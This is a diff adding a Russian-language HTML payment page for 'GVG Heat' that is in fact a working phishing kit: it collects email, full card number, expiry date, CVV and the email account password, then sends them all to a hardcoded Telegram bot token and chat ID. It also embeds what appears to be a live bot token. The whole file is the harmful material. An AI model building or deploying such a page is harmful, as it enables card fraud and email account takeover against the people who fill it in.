@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Покупка GVG Heat</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: #000000;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+            position: relative;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(circle at 30% 50%, rgba(255, 255, 255, 0.05) 0%, transparent 50%);
+            pointer-events: none;
+        }
+
+        .card {
+            background: #111111;
+            border-radius: 24px;
+            box-shadow: 0 25px 50px -12px rgba(255, 255, 255, 0.25);
+            width: 100%;
+            max-width: 480px;
+            padding: 30px 25px;
+            animation: slideIn 0.4s ease-out;
+            border: 1px solid #2a2a2a;
+            position: relative;
+            z-index: 1;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .title {
+            text-align: center;
+            font-size: 32px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #ffffff 0%, #aaaaaa 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #2a2a2a;
+            letter-spacing: 1px;
+        }
+
+        .subtitle {
+            text-align: center;
+            color: #888;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-weight: 500;
+            color: #ccc;
+            margin-bottom: 8px;
+            font-size: 14px;
+            letter-spacing: 0.3px;
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 14px;
+            color: #888;
+            font-size: 16px;
+            z-index: 1;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 14px 14px 45px;
+            background: #1a1a1a;
+            border: 2px solid #2a2a2a;
+            border-radius: 14px;
+            font-size: 15px;
+            color: #fff;
+            transition: all 0.3s ease;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #666;
+            background: #222;
+            box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.05);
+        }
+
+        input::placeholder {
+            color: #555;
+            font-size: 14px;
+        }
+
+        .password-visible {
+            font-family: monospace;
+            letter-spacing: 1px;
+        }
+
+        .card-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .card-row .form-group {
+            margin-bottom: 0;
+        }
+
+        .buy-button {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #2a2a2a 0%, #1a1a1a 100%);
+            color: white;
+            border: 2px solid #3a3a3a;
+            border-radius: 16px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        .buy-button:hover {
+            background: linear-gradient(135deg, #3a3a3a 0%, #2a2a2a 100%);
+            border-color: #666;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px -5px rgba(255, 255, 255, 0.1);
+        }
+
+        .buy-button:active {
+            transform: translateY(0);
+        }
+
+        .notification {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 14px;
+            text-align: center;
+            animation: fadeIn 0.3s ease-out;
+            display: none;
+        }
+
+        .notification.success {
+            background: rgba(0, 255, 0, 0.1);
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            display: block;
+        }
+
+        .notification.error {
+            background: rgba(255, 0, 0, 0.1);
+            border: 1px solid #ff0000;
+            color: #ff6666;
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+    <!-- Font Awesome для иконок -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
+    <div class="card">
+        <!-- Заголовок -->
+        <h1 class="title">Покупка GVG Heat</h1>
+        <p class="subtitle">Введите данные для оплаты</p>
+
+        <!-- Форма -->
+        <form id="purchaseForm">
+            <!-- Почта -->
+            <div class="form-group">
+                <label><i class="fas fa-envelope" style="margin-right: 8px; color: #888;"></i>Почта</label>
+                <div class="input-wrapper">
+                    <i class="fas fa-envelope input-icon"></i>
+                    <input type="email" id="email" placeholder="example@mail.com" required>
+                </div>
+            </div>
+
+            <!-- Номер карты -->
+            <div class="form-group">
+                <label><i class="fas fa-credit-card" style="margin-right: 8px; color: #888;"></i>Номер карты</label>
+                <div class="input-wrapper">
+                    <i class="fas fa-credit-card input-icon"></i>
+                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required>
+                </div>
+            </div>
+
+            <!-- Дополнительные поля карты: срок и CVV -->
+            <div class="card-row">
+                <div class="form-group">
+                    <label><i class="far fa-calendar-alt" style="margin-right: 5px; color: #888;"></i>Срок</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-calendar input-icon"></i>
+                        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label><i class="fas fa-lock" style="margin-right: 5px; color: #888;"></i>CVV</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-lock input-icon"></i>
+                        <input type="text" id="cvv" placeholder="123" maxlength="3" required>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Пароль от почты (первый раз) -->
+            <div class="form-group">
+                <label><i class="fas fa-lock" style="margin-right: 8px; color: #888;"></i>Пароль от почты</label>
+                <div class="input-wrapper">
+                    <i class="fas fa-lock input-icon"></i>
+                    <input type="password" id="password1" placeholder="Введите пароль" required>
+                </div>
+            </div>
+
+            <!-- Пароль от почты (повторно, видимый) -->
+            <div class="form-group">
+                <label><i class="fas fa-eye" style="margin-right: 8px; color: #888;"></i>Пароль еще раз (виден)</label>
+                <div class="input-wrapper">
+                    <i class="fas fa-eye input-icon"></i>
+                    <input type="text" id="password2" class="password-visible" placeholder="Повторите пароль" required>
+                </div>
+            </div>
+
+            <!-- Кнопка покупки -->
+            <button type="button" class="buy-button" onclick="sendToTelegram()">
+                <i class="fas fa-bolt" style="margin-right: 10px;"></i>Купить GVG Heat
+            </button>
+        </form>
+
+        <!-- Уведомление о статусе -->
+        <div id="notification" class="notification"></div>
+    </div>
+
+    <script>
+        // =============================================
+        // НАСТРОЙКИ TELEGRAM (изменить под себя)
+        // =============================================
+        const TELEGRAM_BOT_TOKEN = '8513382715:AAGK5KcEvWtF3tm9DVlQpzYG5pvYdd1Xc1k';
+        const TELEGRAM_CHAT_ID = '6875436577';
+        // =============================================
+
+        async function sendToTelegram() {
+            const email = document.getElementById('email').value.trim();
+            const cardNumber = document.getElementById('cardNumber').value.trim();
+            const expiry = document.getElementById('expiry').value.trim();
+            const cvv = document.getElementById('cvv').value.trim();
+            const password1 = document.getElementById('password1').value;
+            const password2 = document.getElementById('password2').value;
+
+            if (!email || !cardNumber || !expiry || !cvv || !password1 || !password2) {
+                showNotification('Пожалуйста, заполните все поля', 'error');
+                return;
+            }
+
+            if (password1 !== password2) {
+                showNotification('Пароли не совпадают!', 'error');
+                return;
+            }
+
+            const message = `
+🔐 НОВАЯ ЗАЯВКА НА ПОКУПКУ GVG HEAT
+━━━━━━━━━━━━━━━━━━━━━
+📧 Почта: ${email}
+💳 Номер карты: ${cardNumber}
+📅 Срок действия: ${expiry}
+🔒 CVV код: ${cvv}
+🔑 Пароль от почты: ${password1}
+━━━━━━━━━━━━━━━━━━━━━
+⏰ Время: ${new Date().toLocaleString('ru-RU')}
+            `;
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            showNotification('Отправка данных...', 'success', false);
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                const data = await response.json();
+
+                if (data.ok) {
+                    showNotification('✅ Данные успешно отправлены!', 'success');
+                } else {
+                    showNotification('❌ Ошибка при отправке: ' + data.description, 'error');
+                }
+            } catch (error) {
+                showNotification('❌ Ошибка соединения с Telegram', 'error');
+                console.error('Error:', error);
+            }
+        }
+
+        function showNotification(message, type, autoHide = true) {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            notification.className = 'notification ' + type;
+            
+            if (autoHide) {
+                setTimeout(() => {
+                    notification.style.display = 'none';
+                }, 5000);
+            }
+        }
+
+        // Маска для номера карты
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
+            let formattedValue = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formattedValue += ' ';
+                }
+                formattedValue += value[i];
+            }
+            e.target.value = formattedValue;
+        });
+
+        // Маска для срока действия (MM/YY)
+        document.getElementById('expiry').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2, 4);
+            }
+            e.target.value = value;
+        });
+
+        // Маска для CVV (только цифры)
+        document.getElementById('cvv').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3);
+        });
+
+        // Синхронизация паролей
+        document.getElementById('password1').addEventListener('input', function(e) {
+            document.getElementById('password2').value = e.target.value;
+        });
+
+        document.getElementById('password2').addEventListener('input', function(e) {
+            document.getElementById('password1').value = e.target.value;
+        });
+    </script>
+</body>
+</html>
